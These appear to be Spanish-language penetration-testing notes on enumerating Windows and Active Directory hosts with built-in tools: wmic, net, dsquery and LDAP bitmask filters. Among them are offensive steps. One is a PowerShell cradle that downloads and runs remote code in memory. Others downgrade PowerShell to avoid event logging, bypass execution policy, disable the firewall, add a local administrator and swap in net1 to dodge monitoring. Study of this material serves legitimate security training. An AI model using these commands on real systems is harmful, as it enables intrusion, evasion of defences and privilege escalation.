Cuando no tenemos acceso a alguna de las herramientas de explotación 
## Comandos Básicos de Enumeración

- Imprimir nombre del equipo
	```powershell
	hostname
	```

- Mostrar versión del sistema operativo y nivel de revisión
	```powershell
	[System.Environment]::OSVersion.Version
	```

- Mostrar parches y actualizaciones instalados
	```powershell
	wmic qfe get Caption,Description,HotFixID,InstalledOn
	```

- Mostrar estado de adaptadores de red y configuraciones
	```powershell
	ipconfig /all
	```

- Mostrar variables de entorno de la sesión actual (CMD)
	```powershell
	set
	```

- Mostrar el nombre del dominio al que pertenece el equipo (CMD)
	```powershell
	echo %USERDOMAIN%
	```

- Imprimir el nombre del controlador de dominio con el que se autentica el equipo (CMD)
	```powershell
	echo %logonserver%
	```
- Información del sistema
	```powershell
	systeminfo
	```

## Comandos Útiles de PowerShell

- Listar módulos disponibles
	```powershell
	Get-Module
	```

- Imprimir configuración de políticas de ejecución
	```powershell
	Get-ExecutionPolicy -List
	```

- Cambiar temporalmente la política de ejecución
	```powershell
	Set-ExecutionPolicy Bypass -Scope Process
	```

- Devolver valores de entorno (rutas clave, usuarios, etc.)
	```powershell
	Get-ChildItem Env:
	```

- Mostrar historial de comandos de PowerShell
	```powershell
	Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
	```
- Descargar un archivo y cargarlo en memoria (`-nop`: no profile)
	```powershell
	powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"
	```
## Degradar PowerShell
Puede ser útil para ser sigilosos, ya que a partir de la versión 3.0 de powershell se introdujo el event logging
- Comprobar versión actual de PowerShell
	```powershell
	get-host
	```
- Degradar a PowerShell 2.0
	```powershell
	powershell.exe -version 2
	```
- Verificar cambio de versión
	```powershell
	get-host
	```

## Comprobar Firewall
- Verificar el estado del firewall en todos los perfiles
	```powershell
	netsh advfirewall show allprofiles
	```

- Obtener configuraciones avanzadas del sistema y estado de seguridad
	```powershell
	Get-MpComputerStatus
	```
-  Desactivar firewall
	```powershell
	Set-NetFirewallProfile -Profile Public,Private,Domain -Enabled False
	```

- Desde CMD: Consultar el servicio del firewall de Windows Defender
	```powershell
	sc query windefend
	```


## Sesiones Activas en el Sistema - `qwinsta`

- Verificar sesiones activas
	```powershell
	qwinsta
	```

## ## WMI
- Mostrar parches y hotfixes aplicados
	```powershell
	wmic qfe get Caption,Description,HotFixID,InstalledOn
	```

- Mostrar información básica del equipo
	```powershell
	wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List
	```

- Listar todos los procesos activos
	```powershell
	wmic process list /format:list
	```

- Mostrar información del dominio y controladores de dominio
	```powershell
	wmic ntdomain list /format:list
	```

- Listar cuentas locales y de dominio que hayan iniciado sesión
	```powershell
	wmic useraccount list /format:list
	```

- Mostrar información de todos los grupos locales
	```powershell
	wmic group list /format:list
	```

- Ver cuentas del sistema utilizadas como cuentas de servicio
	```powershell
	wmic sysaccount list /format:list
	```

## Net commands

**Truco:** Si hay medidas de monitoreo, probar `net1` en vez de `net`.
- Mostrar información sobre requisitos de contraseña
	```powershell
	net accounts
	```

- Mostrar políticas de contraseña y bloqueo del dominio
	```powershell
	net accounts /domain
	```

- Listar grupos del dominio
	```powershell
	net group /domain
	```

- Listar usuarios con privilegios de administrador de dominio
	```powershell
	net group "Domain Admins" /domain
	```
- Listar equipos conectados al dominio
	```powershell
	net group "domain computers" /domain
	```

- Mostrar cuentas de PC de controladores de dominio
	```powershell
	net group "Domain Controllers" /domain
	```

- Listar usuarios de un grupo de dominio específico
	```powershell
	net group <domain_group_name> /domain
	```

- Listar grupos del dominio
	```powershell
	net groups /domain
	```

- Mostrar grupos locales disponibles
	```powershell
	net localgroup
	```

- Listar administradores dentro del dominio
	```powershell
	net localgroup administrators /domain
	```

- Agregar usuario a administradores
	```powershell
	net localgroup administrators [username] /add
	```

- Verificar recursos compartidos
	```powershell
	net share
	```

- Mostrar información de un usuario del dominio
	```powershell
	net user <ACCOUNT_NAME> /domain
	```

- Listar todos los usuarios del dominio
	```powershell
	net user /domain
	```

- Información del usuario actual
	```powershell
	net user %username%
	```

- Montar un recurso compartido localmente
	```powershell
	net use x: \\computer\share
	```

- Listar computadoras en el dominio
	```powershell
	net view
	```

- Listar recursos compartidos del dominio
	```powershell
	net view /all /domain[:domainname]
	```

- Mostrar recursos compartidos de un equipo específico
	```powershell
	net view \\computer /ALL
	```

- Listar PCs del dominio
	```powershell
	net view /domain
	```

## DSQuery
Herramienta nativa de Windows. Puede ser utilizada para encontrar objetos en un AD. Por defecto se encuentra en `C:\Windows\System32\dsquery.dll`.
- Buscar usuarios
	```powershell
	dsquery user
	```

- Buscar equipos
	```powershell
	dsquery computer
	```

- Buscar con comodín `*`
	```powershell
	dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
	```


### Filtrados LDAP
**UserAccountControl** es un atributo de 32 bits (DWORD) que actúa como una **máscara de bits**. Cada bit representa una opción o configuración específica de la cuenta. Se pueden combinar múltiples valores usando operadores lógicos para establecer diferentes configuraciones al mismo tiempo.
![[Pasted image 20250107180258.png]]
- Buscar usuarios que no requieren contraseña
	```powershell
	dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
	```

- Buscar controladores de dominio
	```powershell
	dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
	```
- Cuentas de equipos
	```powershell
	dsquery * -filter "(&(objectClass=computer) userAccountControl:1.2.840.113556.1.4.803:=4096))"
	```
#### Significado `1.2.840.113556.1.4.803`
- Es un **OID** (Object Identifier) que representa el operador `LDAP_MATCHING_RULE_BIT_AND`.
- Este operador permite filtrar objetos que tienen **bits específicos activados** en un valor de tipo bitmask, como `UserAccountControl`.
- Existen otros operadores OID con valores distintos, como `LDAP_MATCHING_RULE_BIT_OR`, que tiene el valor `1.2.840.113556.1.4.804`